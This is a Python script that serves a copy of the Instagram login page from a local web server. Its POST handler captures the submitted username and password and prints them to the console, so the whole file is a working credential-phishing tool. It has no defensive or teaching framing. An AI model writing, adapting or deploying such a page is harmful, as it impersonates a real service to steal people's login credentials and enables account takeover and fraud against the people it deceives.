import http.server
import socketserver
from urllib.parse import parse_qs

PORT = 8080

html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            width: 350px;
            padding: 40px;
            border-radius: 1em;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        .login-container h1 {
            text-align: center;
            font-size: 32px;
            margin-bottom: 20px;
            color: #262626;
        }
        .login-form {
            display: flex;
            flex-direction: column;
        }
        .login-form input {
            padding: 10px;
            margin-bottom: 10px;
            font-size: 16px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        .login-form input:focus {
            outline: none;
            border-color: #0095f6;
        }
        .login-form input[type="submit"] {
            background-color: #0095f6;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
        .login-form input[type="submit"]:hover {
            background-color: #007bb5;
        }
        .login-container .or-divider {
            text-align: center;
            margin: 20px 0;
            color: #8e8e8e;
        }
        .login-container .or-divider::before,
        .login-container .or-divider::after {
            content: '';
            display: inline-block;
            width: 40%;
            height: 1px;
            background-color: #dbdbdb;
            vertical-align: middle;
        }
        .login-container .or-divider span {
            padding: 0 10px;
        }
        .login-container .forgot-password {
            text-align: center;
            font-size: 14px;
            color: #0095f6;
            text-decoration: none;
        }
        .login-container .forgot-password:hover {
            text-decoration: underline;
        }
        .login-container .signup-text {
            text-align: center;
            margin-top: 10px;
        }
        .login-container .signup-text a {
            color: #0095f6;
            text-decoration: none;
        }
        .login-container .signup-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>Instagram</h1>
        <form class="login-form" action="/" method="POST">
            <input type="text" name="username" id="username" placeholder="Phone number, email or username" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
        <div class="or-divider">
            <span>OR</span>
        </div>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        <div class="signup-text">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

</body>
</html>

"""

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes(html_content, "utf-8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_data = parse_qs(post_data.decode('utf-8'))
        username = post_data.get('username', [None])[0]
        password = post_data.get('password', [None])[0]

        print(f"Username: {username}")
        print(f"Password: {password}")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes(html_content, "utf-8"))

Handler = RequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()